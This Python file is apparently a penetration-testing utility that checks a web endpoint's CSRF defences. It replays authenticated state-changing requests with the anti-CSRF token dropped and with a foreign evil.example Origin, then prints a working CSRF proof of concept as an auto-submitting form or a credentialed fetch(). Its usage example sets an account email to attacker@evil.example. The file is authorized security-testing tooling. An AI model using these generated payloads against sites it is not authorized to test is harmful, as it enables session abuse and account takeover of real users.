#!/usr/bin/env python3
"""csrf_probe.py — original, owned CSRF posture probe + PoC generator for pen_test.

CSRF can't be fully auto-confirmed (it needs a victim browser with an ambient
session), so this does the two things a script honestly can:

  1. Assess the posture of a state-changing request — anti-CSRF token presence
     and validation, cookie SameSite/Secure flags, and Origin/Referer
     enforcement — by actually replaying the request with the token dropped and
     with a foreign Origin, and diffing the responses.
  2. Emit a ready-to-serve CSRF PoC (auto-submitting form for form-encoded,
     fetch() for JSON) to fire against the target in claude-in-chrome under a
     real authenticated session — the actual validation bar.

Runs through the shared _httpcore engine with your authenticated session
(-b/--bearer/-H) — CSRF only matters against a state change the session can make.

AUTHORIZATION: sends real, state-CHANGING requests. Authorized targets only,
and be aware each run may actually perform the action — see agents/pen_test.md.

    python3 csrf_probe.py -u https://app/account/email -X POST \
        --data "email=attacker@evil.example" -b "session=..." --token-param csrf_token
    python3 csrf_probe.py -u https://app/api/profile -X POST --location json \
        --json '{"name":"x"}' --bearer "$T"
"""

from __future__ import annotations

import argparse
import json as _json
import re

import _httpcore as core

TOKEN_HINT = re.compile(r'name=["\']([^"\']*(?:csrf|xsrf|token|authenticity)[^"\']*)["\']', re.I)
META_TOKEN = re.compile(r'<meta[^>]+(?:csrf|xsrf|token)[^>]*content=["\']([^"\']+)["\']', re.I)


def _h(headers: dict, name: str) -> str | None:
    name = name.lower()
    for k, v in headers.items():
        if k.lower() == name:
            return v
    return None


def _all_set_cookie(headers: dict) -> list[str]:
    # requests collapses multiple Set-Cookie into one comma-joined header; good
    # enough to inspect flags heuristically.
    raw = _h(headers, "set-cookie")
    return raw.split(",") if raw else []


def recon(client, url) -> None:
    r = client.request("GET", url)
    print(f"[recon] GET {url}  status={r.status}")
    if not r.ok:
        print(f"        (could not fetch for recon: {r.error})")
        return
    tokens = set(TOKEN_HINT.findall(r.text)) | set(
        m for m in ([] if not META_TOKEN.search(r.text) else [META_TOKEN.search(r.text).group(1)])
    )
    if tokens:
        print(f"        anti-CSRF token field(s) seen: {sorted(tokens)}")
    else:
        print("        no obvious anti-CSRF token field in the page (may use header/cookie double-submit, or none)")
    cookies = _all_set_cookie(r.headers)
    if cookies:
        for c in cookies:
            name = c.split("=")[0].strip()
            low = c.lower()
            ss = "SameSite=" + (re.search(r"samesite=(\w+)", low).group(1) if "samesite=" in low else "MISSING")
            flags = ss + (" Secure" if "secure" in low else " no-Secure") + (" HttpOnly" if "httponly" in low else " no-HttpOnly")
            note = ""
            if "samesite=" not in low or "samesite=none" in low:
                note = "  <- cross-site sendable (CSRF-relevant)"
            print(f"        cookie {name}: {flags}{note}")


def build_kwargs(args, *, origin: str | None, drop_token: bool):
    form = core.parse_kv(args.data.split("&"), "=") if args.data else {}
    jbody = _json.loads(args.json) if args.json else None
    if drop_token and args.token_param:
        form.pop(args.token_param, None)
        if jbody:
            jbody.pop(args.token_param, None)
    headers = {}
    if origin:
        headers["Origin"] = origin
        headers["Referer"] = origin + "/"
    return {
        "method": args.method, "url": args.url,
        "data": form or None, "json": jbody,
        "headers": headers or None,
    }


def poc_html(args) -> str:
    if args.json:
        body = args.json
        return f"""<!-- CSRF PoC (JSON) — open in a browser with an active {args.url} session -->
<html><body><script>
fetch("{args.url}", {{
  method: "{args.method}", credentials: "include",
  headers: {{ "Content-Type": "application/json" }},
  body: JSON.stringify({body})
}});
</script></body></html>"""
    fields = ""
    if args.data:
        for k, v in core.parse_kv(args.data.split("&"), "=").items():
            fields += f'  <input type="hidden" name="{k}" value="{v}">\n'
    return f"""<!-- CSRF PoC (form) — open in a browser with an active {args.url} session -->
<html><body>
<form id="f" action="{args.url}" method="{args.method}">
{fields}</form>
<script>document.getElementById("f").submit();</script>
</body></html>"""


def run(args) -> None:
    client = core.client_from_args(args)
    core.require_scheme(args.url)
    print(f"CSRF probe: {args.method} {args.url}")
    print("-" * 72)
    recon(client, args.url)

    print("\n[test] replaying the state-changing request three ways:")
    base = client.request(**build_kwargs(args, origin=None, drop_token=False))
    foreign = client.request(**build_kwargs(args, origin="https://evil.example", drop_token=False))
    print(f"   as-is (with token/creds)      : status={base.status} len={base.length}")
    print(f"   foreign Origin/Referer        : status={foreign.status} len={foreign.length}"
          + ("   <- SAME as baseline: Origin/Referer NOT enforced" if foreign.signature() == base.signature() and base.ok else ""))
    if args.token_param:
        notok = client.request(**build_kwargs(args, origin=None, drop_token=True))
        print(f"   token `{args.token_param}` dropped        : status={notok.status} len={notok.length}"
              + ("   <- SAME as baseline: token NOT validated" if notok.signature() == base.signature() and base.ok else "   (differs -> token appears enforced)"))

    origin_unenforced = base.ok and foreign.signature() == base.signature()
    print("\n" + "=" * 72)
    if origin_unenforced:
        print("[?] LIKELY CSRF-EXPOSED — a foreign Origin/Referer produced the same result as the")
        print("    legitimate request. Confirm by firing the PoC below in claude-in-chrome under a real")
        print("    victim session and observing the state actually change (knowledge/web_infra.md).")
    else:
        print("[-] The request appears to react to Origin/token — confirm manually, then move on")
        print("    (a differing response is not proof of protection, but it lowers priority).")
    print("\n--- CSRF PoC (serve this, visit as an authenticated victim) ---")
    print(poc_html(args))


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True, help="the state-changing endpoint")
    p.add_argument("-X", "--method", default="POST")
    p.add_argument("--location", default="form", choices=["form", "json"], help="body encoding")
    p.add_argument("--data", help="form body k=v&k=v")
    p.add_argument("--json", help="JSON body")
    p.add_argument("--token-param", help="name of the anti-CSRF field to test dropping")
    core.add_common_args(p)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
